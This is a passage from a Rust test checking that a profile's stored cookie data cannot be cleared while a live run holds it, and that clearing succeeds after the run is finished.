    let (run_id, handle) = register(&state, "org", Interactive, T0).await;
    handle.entry.lock().await.lease.profile_id = profile.clone();

    let claims = crate::auth::Claims {
        web_policy: None,
        sub: "user".to_owned(),
        iss: "test".to_owned(),
        exp: i64::MAX,
        org_id: "org".to_owned(),
        user_id: "user".to_owned(),
        principal_type: Some("user".to_owned()),
        service_id: None,
        nbf: None,
        aud: None,
        scopes: Vec::new(),
        zdr: None,
        key_id: None,
        acting_user_id: None,
    };
    let clear = |dry_run: bool| {
        clear_profile_data(
            State(state.clone()),
            Extension(claims.clone()),
            Path(profile.to_string()),
            Json(ClearDataRequest { dry_run }),
        )
    };

    let (status, body) = clear(false).await.expect_err("a profile a live run holds is refused");
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(
        body.0.error.as_ref().unwrap().details.as_ref().unwrap()["reason"],
        "profile_in_use"
    );
    let still = state.profiles.load("org", &profile).await.unwrap().unwrap();
    assert_eq!(
        still.cookies.len(),
        1,
        "the stored data is untouched while the run is open"
    );

    finish_run(&state, &run_id, handle, CloseReason::Explicit)
        .await
        .unwrap();
    let cleared = clear(false).await.unwrap().0.data.unwrap();
    assert!(cleared.cleared);
    let after = state.profiles.load("org", &profile).await.unwrap().unwrap();
    assert!(after.cookies.is_empty());
}
